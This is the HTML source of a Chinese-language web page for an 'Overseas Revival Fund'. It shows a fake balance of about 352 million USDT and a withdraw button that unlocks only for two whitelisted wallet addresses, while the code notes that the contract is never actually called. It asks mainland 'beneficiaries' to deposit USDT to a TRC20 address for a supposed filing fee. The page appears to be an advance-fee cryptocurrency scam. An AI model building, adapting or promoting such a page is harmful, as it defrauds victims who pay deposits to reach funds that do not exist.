

  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>海外复兴基金</title>
  <style>
    body {
      font-family: "Microsoft YaHei", sans-serif;
      background-color: #f2f4f8;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    header {
      background-color: #007bff;
      color: white;
      padding: 20px 0;
      font-size: 24px;
      font-weight: bold;
      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }

    .container {
      background: white;
      max-width: 640px;
      margin: 28px auto;
      padding: 26px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
      text-align: left;
    }

    .card {
      background: #f8f9fa;
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 18px;
      text-align: left;
    }

    p {
      margin: 10px 0;
      font-size: 15px;
    }

    .balance {
      color: green;
      font-size: 1.4em;
      margin-top: 8px;
    }

    #status {
      margin-top: 10px;
      color: #666;
      min-height: 1.2em;
    }

    button {
      margin-top: 12px;
      padding: 10px 18px;
      font-size: 14px;
      border: none;
      border-radius: 6px;
      background: #28a745;
      color: #fff;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover:not(:disabled) {
      background-color: #218838;
    }

    button:disabled {
      background: #ccc;
      cursor: not-allowed;
    }

    .tip {
      margin-top: 18px;
      font-size: 13px;
      color: #999;
    }

    /* 充值区 */
    .deposit {
      display: flex;
      gap: 16px;
      align-items: flex-start;
      flex-wrap: wrap;
    }

    .deposit .left {
      flex: 1 1 260px;
      min-width: 260px;
    }

    .deposit .right {
      width: 220px;
      min-width: 180px;
      text-align: center;
    }

    .addr-box {
      background: #fff;
      border: 1px dashed #ddd;
      padding: 12px;
      border-radius: 6px;
      word-break: break-all;
      font-size: 14px;
    }

    .small {
      font-size: 12px;
      color: #666;
    }

    .copy-btn {
      background:#007bff;
      color:#fff;
      border-radius:6px;
      padding:8px 10px;
      border:none;
      cursor:pointer;
    }

    img.qr-image {
      max-width: 220px;
      width: 100%;
      height: auto;
      border-radius: 6px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
      margin-top: 8px;
    }

    .network-badge {
      display: inline-block;
      padding: 4px 8px;
      border-radius: 14px;
      background: #e9ecef;
      font-size: 12px;
      color: #333;
    }
  </style>
</head>
<body>

  <header>海外复兴基金</header>

  <div class="container">

    <div class="card">
      <p><strong>三方协议信息</strong></p>
      <p>资金方（出资人）：马伯平</p>
      <p>接受方（收款人）：黄福文</p>
      <p>监管方（托管机构）：汇丰银行信托</p>
    </div>

    <p>钱包地址：TKHuVq1oKVruCGLvqVexFs6dawKv6fQgFs<span id="addr">未连接</span></p>
    <p class="balance">352,540,142 USDT</p>
    <button id="btn" disabled>提现 352,540,142 USDT</button>
    <p id="status"></p>

    <!-- 新增：充值区 -->
    <div class="card">
      <p><strong>大陆受益人信息备案充值USDT 地址</strong></p>

      <div class="deposit">
        <div class="left">
          <p class="small">收款网络：</p>
          <span class="network-badge">TRC20</span>

          <p class="small" style="margin-top:10px;">收款地址：</p>
          <div class="addr-box">TXsWrT6NB4WtuR76MaCuHvJ7wXE2GK45xv</div>

          <button class="copy-btn" id="copyAddrBtn">复制地址</button>

          <p class="small tip" style="margin-top:10px;">
            此地址仅支持 TRX/TRC20 相关资产。请务必确认网络类型一致，误转账可能导致资产丢失。
          </p>
        </div>

        <div class="right">
          <img class="qr-image" src="qr.jpg" alt="TRC20 USDT 收款二维码">
          <div class="small">扫描二维码充值</div>
        </div>
      </div>
    </div>

    <p class="tip">仅限授权地址指令性提现</p>
  </div>

  <!-- TronLink 检测 + 钱包显示 + 白名单逻辑 -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
  <script>
    // 默认显示网络
    let currentNetwork = 'TRC20';

    // 白名单地址（允许提现）
    const ALLOWED = [
      'TX8egpuTL5X1ZCtvDzQfFUuy1NFJobVbbX',
      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
    ];

    // 合约信息（仅保留展示，不实际调用）
    const CONTRACT_ADDRESS = 'TFFf2iQjJxxPjs4HwxBm1Tfa695LWAZPL';
    const CONTRACT_ABI = [
      { "inputs": [], "name": "withdraw", "outputs": [], "stateMutability": "nonpayable", "type": "function" }
    ];

    const $addr   = document.getElementById('addr');
    const $status = document.getElementById('status');
    const $btn    = document.getElementById('btn');

    // 检测 TronLink 钱包
    async function waitForTronLink(timeout = 10000) {
      const start = Date.now();
      while (Date.now() - start < timeout) {
        if (window.tronWeb && tronWeb.ready) return true;
        await new Promise(r => setTimeout(r, 300));
      }
      return false;
    }

    // 初始化钱包逻辑
    async function initWallet() {
      if (!await waitForTronLink()) {
        $status.textContent = '未检测到 TronLink 钱包';
        return;
      }

      const user = tronWeb.defaultAddress.base58;
      $addr.textContent = user || '连接失败';

      if (!ALLOWED.includes(user)) {
        $status.textContent = '非授权地址 ❌';
        $btn.disabled = true;
      } else {
        $status.textContent = '地址已授权 ✅';
        $btn.disabled = false;
      }
    }

    // 复制收款地址
    document.getElementById("copyAddrBtn").onclick = async () => {
      const addr = "TXsWrT6NB4WtuR76MaCuHvJ7wXE2GK45xv";
      try {
        await navigator.clipboard.writeText(addr);
        alert("地址已复制到剪贴板");
      } catch {
        alert("复制失败，请手动复制");
      }
    };

    window.addEventListener('load', initWallet);
  </script>

</body>
</html>
